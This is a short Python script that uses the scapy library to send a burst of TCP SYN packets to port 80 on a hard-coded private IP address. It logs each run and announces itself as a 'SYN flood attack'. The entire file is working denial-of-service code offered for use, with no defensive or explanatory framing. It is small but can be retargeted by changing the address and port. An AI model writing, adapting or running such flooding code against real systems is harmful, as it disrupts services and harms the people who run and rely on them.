import logging
from scapy.all import IP, TCP, send
import time

# Logging setup
logging.basicConfig(filename='syn_attack.log', level=logging.INFO,
                    format='%(asctime)s - %(message)s')

# Target IP and Port
ip = "192.168.1.100"
port = 80

# Create SYN packet
packet = IP(dst=ip) / TCP(dport=port, flags="S")

def send_syn_packets():
    try:
        logging.info(f"Sending SYN packets to {ip}:{port}")
        send(packet, loop=1, count=100)
        logging.info(f"Successfully sent 100 SYN packets to {ip}:{port}")
    except Exception as e:
        logging.error(f"Error while sending packets: {e}")
        print(f"Error: {e}")

if __name__ == "__main__":
    print(f"Starting SYN flood attack on {ip}:{port}...")
    send_syn_packets()
    print(f"Attack finished. Check the logs for details.")

